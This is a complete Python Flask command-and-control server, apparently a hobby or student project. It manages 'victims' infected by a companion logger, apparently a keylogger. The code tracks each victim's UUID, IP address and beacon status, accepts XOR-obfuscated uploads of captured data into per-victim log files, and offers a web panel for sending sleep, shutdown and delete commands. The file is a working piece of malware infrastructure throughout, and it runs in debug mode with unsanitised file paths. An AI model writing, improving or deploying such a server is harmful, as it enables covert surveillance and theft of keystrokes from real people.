# Command and Control Server
# Vaibhav Ekambaram

# Application Parameters
# debug=True
# host='0.0.0.0'

# Libraries to Import
import os
import os.path

from flask import Flask, request, redirect
import datetime
import time

# Application
app = Flask(__name__)

# List for storing information about each victim
victims_list = []

# Generate path for storing logs
log_database_path = r'static\logs'
if not os.path.exists(log_database_path):
    os.makedirs(log_database_path)


# Generator function for submit button, rather than having to call the whole html string again and again
def submit_button(button_value, uuid):
    return "<input type = \"submit\" value=\"" + button_value + "\" name = \"" + uuid + "\"/>"


# Render function to draw
def draw_table():
    t_string = """<table border="1"><tr><th>UUID</th><th>Address</th><th>Last 
    Updated</th><th>Status</th><th>Logs</th><th>Commands</th></tr> """

    # Loop through victims list and generate a table entry with information and action buttons for each
    for x in victims_list:
        # get time of last beacon
        stored_time = x[2].timestamp()
        # get current time
        current_time = time.time()

        # determine status, a victim is considered active if it has sent a beacon back to the C2 within 60 seconds
        status = "Active"
        if (current_time - stored_time) >= 60:
            status = "Expired"

        # table html
        t_loop = ("<tr><td>" + x[0] +
                  "</td><td>" + x[1] + "</td>" +
                  "<td>" + x[2].strftime("%m/%d/%Y, %H:%M:%S") + "</td>" +
                  "<td>" + status + "</td>" +
                  "<td>" + "<a href=\"static/logs/" + str(x[0]) + ".txt\"/>Link</a>" + "</td>" +
                  "<td><form method = \"post\" action = \"/\">" +
                  "<input type=\"number\" id=\"quantity\" name=\"" + str(
                    x[0]) + " sleep_num\" min=\"1\" max=\"100\" placeholder=\"seconds\">" +
                  submit_button("Sleep", str(x[0])) +
                  submit_button("Shutdown", str(x[0])) +
                  submit_button("Delete", str(x[0])) +
                  "</form></td></tr>")

        t_string += t_loop
    if len(victims_list) > 0:
        t_string += """</table>"""

    return t_string


# Primary routing path, used to handle the main functionality of the C2 server apart from the web frontend
@app.route('/', methods=['GET', 'POST', 'PUT'])
def index():
    # Handle secondary telegraphing message from logger
    if request.method == 'POST':
        for x in victims_list:
            victim_uuid = str(x[0])

            # Sleep
            if request.form.get(victim_uuid) == 'Sleep':
                sleep_time = str(request.form.get(str(x[0]) + " sleep_num"))
                if len(sleep_time) == 0:
                    sleep_time = 0
                x[3] = ("Sleep " + victim_uuid + " " + str(sleep_time))

            # Shutdown
            if request.form.get(victim_uuid) == 'Shutdown':
                shutdown_string = "Shutdown " + victim_uuid
                x[3] = shutdown_string

            # Delete
            if request.form.get(victim_uuid) == 'Delete':
                x[3] = "Delete " + victim_uuid
                if os.path.exists(os.path.join("static/logs/", victim_uuid + ".txt")):
                    os.remove(os.path.expanduser(os.path.join("static/logs/", victim_uuid + ".txt")))
        # Value is stored in the victims list parameters for when a beacon request comes in, so we can just redirect
        return redirect(request.host_url + "listclients")

    # Handle primary beacon request from logger
    if request.method == 'PUT':
        # set default return status
        return_status = "Connected"

        # retrieve victim uuid
        beacon_uuid = decrypt(str(request.data.decode('utf-8'))).split()[0]

        found_existing = False
        for i in range(len(victims_list)):
            # if existing entry is found
            if victims_list[i][0] == beacon_uuid:
                found_existing = True
                return_status = victims_list[i][3]
                victims_list[i][3] = "Connected"

                victims_list[i] = [beacon_uuid, request.remote_addr, datetime.datetime.now(), victims_list[i][3], ""]
        # create file if it doesn't exist
        f2 = open(os.path.expanduser(os.path.join("static/logs/", beacon_uuid + ".txt")), "a+")
        f2.close()

        # otherwise create new listing
        if not found_existing:
            # create file is it doesn't exist
            f = open(os.path.expanduser(os.path.join("static/logs/", beacon_uuid + ".txt")), "a+")
            f.close()

            # add listing to victims list
            victims_list.append([beacon_uuid, request.remote_addr, datetime.datetime.now(), return_status])
        return encrypt(return_status + " " + decrypt(str(request.data.decode('utf-8'))).split()[1])
    return redirect(request.host_url + "listclients")


# list clients web frontend
@app.route('/listclients', methods=['GET'])
def list_clients():
    # return html page
    return """
    <meta http-equiv="refresh" content="10">                
    <h1>Command and Control Server</h1><h2>Victims</h2> 
    Note: Page is automatically updated every 10 seconds
    """ + draw_table()

# encrypt with xor
def encrypt(input_string):
    length = len(input_string)
    # encryption key = 'E'
    encryption_key = chr(59 + 10)

    # perform xor encoding
    for i in range(length):
        input_string = (input_string[:i] + chr(ord(input_string[i]) ^ ord(encryption_key)) + input_string[i + 1:])

    # return encoded string converted to hex
    return input_string.encode('utf-8').hex()

# decrypt with xor
def decrypt(input_string):
    # convert input string back from hex back to a string
    input_string = bytes.fromhex(input_string).decode('utf-8')

    length = len(input_string)

    # encryption key = 'E'
    encryption_key = chr(59 + 10)

    # perform xor decoding
    for i in range(length):
        input_string = (input_string[:i] + chr(ord(input_string[i]) ^ ord(encryption_key)) + input_string[i + 1:])

    return input_string

# routing for handling file uploads
@app.route('/POST', methods=['POST'])
def upload():
    if request.method == 'POST':
        request_string_split = request.data.decode('utf-8').split()
        request_contents = decrypt(request_string_split[0]).split(" ", 1)
        upload_uuid = request_contents[0]
        # save file information in plain text corresponding to the recorded uuid
        path = "static/logs/" + (upload_uuid + ".txt")
        if len(request_contents) == 2:
            file = open(path, "a")
            file.write(request_contents[1])
            file.close()
        # if the file exists on this then we can consider this action a success
        if os.path.exists(path):
            return encrypt("Success " + request_string_split[1])
        else:
            return encrypt("Failure")

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0')